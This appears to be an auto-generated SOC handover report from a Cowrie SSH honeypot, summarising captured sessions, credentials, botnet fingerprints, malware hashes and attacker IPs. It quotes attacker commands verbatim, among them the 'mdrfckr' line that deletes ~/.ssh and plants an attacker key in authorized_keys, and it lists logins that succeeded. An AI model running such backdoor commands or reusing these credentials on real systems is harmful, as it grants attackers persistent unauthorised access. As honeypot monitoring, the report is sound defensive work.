# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-02 |
| **Generated At** | 2026-05-02T19:06:09Z |
| **Shift Time** | 19:06 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **727** |
| Confirmed Threats | **31** |
| False Positives Filtered | **696** (95.7%) |
| Unique Attacker IPs | **30** |
| Countries of Origin | **18** |
| High Severity Cases | **3** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **724** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **6** |
| Unique Credential Pairs | **6** |
| Unique Usernames | **4** |
| Unique Passwords | **6** |
| Successful Auth Pairs | **3** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 3 |
| `ubuntu` | 1 |
| `ts3bot` | 1 |
| `345gs5662d34` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456A@` | 1 |
| `1` | 1 |
| `qq123456@` | 1 |
| `345gs5662d34` | 1 |
| `3245gs5662d34` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `ubuntu` | `123456A@` | 1 |
| `ts3bot` | `1` | 1 |
| `root` | `qq123456@` | 1 |
| `345gs5662d34` | `345gs5662d34` | 1 |
| `root` | `3245gs5662d34` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qq123456@` | `221.127.183.20` | 2026-05-02T17:39:14 |
| `root` | `3245gs5662d34` | `221.127.183.20` | 2026-05-02T17:39:17 |
| `root` | `qazxsw` | `102.216.69.112` | 2026-05-02T18:22:19 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **727** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 22 |
| OpenSSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 14 | 1 |
| `af8223ac9914...` | libssh-based | 3 | 1 |
| `ec9ea89c70f5...` | Mirai/variant | 1 | 1 |
| `e788c657d1a2...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 14 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 3 | — |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `ec9ea89c70f5...` | OpenSSH | 1 | 1 | Mirai/variant |
| `e788c657d1a2...` | OpenSSH | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1082, T1592, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
cat /proc/mounts; /bin/busybox TPIEC
```
Source IPs: `102.216.69.112`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `221.127.183.20`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **30** |
| Unique ASNs | **26** |
| High-Risk ASNs | **6** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 2 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS36926` | Airtel Networks Kenya Limited | 2 | LOW |
| `AS14061` | DigitalOcean, LLC | 2 | MEDIUM |
| `AS29688` | Vostok Ltd. | 1 | MEDIUM |
| `AS272809` | THUNDERNET, C.A. | 1 | LOW |
| `AS18501` | CyberCloud Professionals LLC | 1 | LOW |
| `AS262617` | UWBR VOX Telecomunicações S/A | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (3)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f91612001111

| Field | Detail |
|---|---|
| **Source IP** | `221.127.183[.]20` |
| **First Seen** | 2026-05-02 17:39 |
| **Last Seen** | 2026-05-02 17:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 17:39:13` | `cowrie.session.connect` |
| `2026-05-02 17:39:13` | `cowrie.client.version` |
| `2026-05-02 17:39:13` | `cowrie.client.kex` |
| `2026-05-02 17:39:14` | `cowrie.login.success` |
| `2026-05-02 17:39:14` | `cowrie.session.params` |
| `2026-05-02 17:39:14` | `cowrie.command.input` |
| `2026-05-02 17:39:14` | `cowrie.command.failed` |
| `2026-05-02 17:39:14` | `cowrie.log.closed` |
| `2026-05-02 17:39:14` | `cowrie.session.params` |
| `2026-05-02 17:39:14` | `cowrie.command.input` |
| `2026-05-02 17:39:14` | `cowrie.session.file_download` |
| `2026-05-02 17:39:14` | `cowrie.log.closed` |
| `2026-05-02 17:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.127.183[.]20` to AbuseIPDB if not already reported
- [ ] Block `221.127.183[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c72039a6898a

| Field | Detail |
|---|---|
| **Source IP** | `221.127.183[.]20` |
| **First Seen** | 2026-05-02 17:39 |
| **Last Seen** | 2026-05-02 17:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 17:39:16` | `cowrie.session.connect` |
| `2026-05-02 17:39:16` | `cowrie.client.version` |
| `2026-05-02 17:39:16` | `cowrie.client.kex` |
| `2026-05-02 17:39:17` | `cowrie.login.success` |
| `2026-05-02 17:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.127.183[.]20` to AbuseIPDB if not already reported
- [ ] Block `221.127.183[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cff1a898205

| Field | Detail |
|---|---|
| **Source IP** | `102.216.69[.]112` |
| **First Seen** | 2026-05-02 18:22 |
| **Last Seen** | 2026-05-02 18:24 |
| **Session Duration** | 103s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, cat /proc/mounts; /bin/busybox TPIEC` |
| **Download Attempts** | tfxxp://37.131.200[.]170:1794/.i |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 18:22:18` | `cowrie.session.connect` |
| `2026-05-02 18:22:18` | `cowrie.telnet.option` |
| `2026-05-02 18:22:19` | `cowrie.login.success` |
| `2026-05-02 18:22:19` | `cowrie.session.params` |
| `2026-05-02 18:22:19` | `cowrie.command.input` |
| `2026-05-02 18:22:19` | `cowrie.command.input` |
| `2026-05-02 18:22:19` | `cowrie.command.failed` |
| `2026-05-02 18:22:19` | `cowrie.command.input` |
| `2026-05-02 18:22:19` | `cowrie.command.failed` |
| `2026-05-02 18:22:19` | `cowrie.command.input` |
| `2026-05-02 18:22:19` | `cowrie.command.input` |
| `2026-05-02 18:22:20` | `cowrie.command.input` |
| `2026-05-02 18:22:20` | `cowrie.command.input` |
| `2026-05-02 18:22:20` | `cowrie.command.input` |
| `2026-05-02 18:22:20` | `cowrie.command.failed` |
| `2026-05-02 18:22:21` | `cowrie.command.input` |
| `2026-05-02 18:22:21` | `cowrie.command.input` |
| `2026-05-02 18:22:56` | `cowrie.session.file_download` |
| `2026-05-02 18:24:01` | `cowrie.log.closed` |
| `2026-05-02 18:24:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.216.69[.]112` to AbuseIPDB if not already reported
- [ ] Block `102.216.69[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.103.117[.]84` | **19** | 2026-05-02 16:54 | 2026-05-02 17:03 | 34m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.26.104[.]212` | **3** | 2026-05-02 18:43 | 2026-05-02 18:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `213.209.159[.]219` | **3** | 2026-05-02 18:51 | 2026-05-02 18:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.155[.]86` | 1 | 2026-05-02 16:54 | 2026-05-02 16:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.178.16[.]179` | 1 | 2026-05-02 17:02 | 2026-05-02 17:02 | 13s | 0 | `T1592` | 🟢 LOW |
| `221.127.183[.]20` | 1 | 2026-05-02 17:39 | 2026-05-02 17:39 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `221.127.183[.]20` | HK | HGC Global Communications Limited | **100** ⚠️ | 5 |
| `118.26.104[.]212` | GB | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `213.209.159[.]219` | DE | Feo Prest SRL | **100** ⚠️ | 0 |
| `101.126.155[.]86` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `14.103.117[.]84` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `172.178.16[.]179` | US | Microsoft Limited | **100** ⚠️ | 45 |
| `193.226.77[.]175` | DE | Virtono Networks SRL | **76** | 1 |
| `102.216.69[.]112` | KE | Mobile_Broadband_4G | **71** | 37 |
| `89.43.132[.]179` | SY | Turk Telekom International HU Kft | **70** | 0 |
| `144.126.217[.]132` | US | DigitalOcean, LLC | **68** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 24 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 3 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |

---

## 🔕 False Positive Summary (696 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 7 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 683 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 727 cases |
| Tool 34  | Credential Extractor        | ✅ 6 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 30 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 696 filtered (95.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 3 priority case(s) shown individually · 6 recon entry/entries in table (3 group(s) consolidating 25 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-02T19:06:09Z_
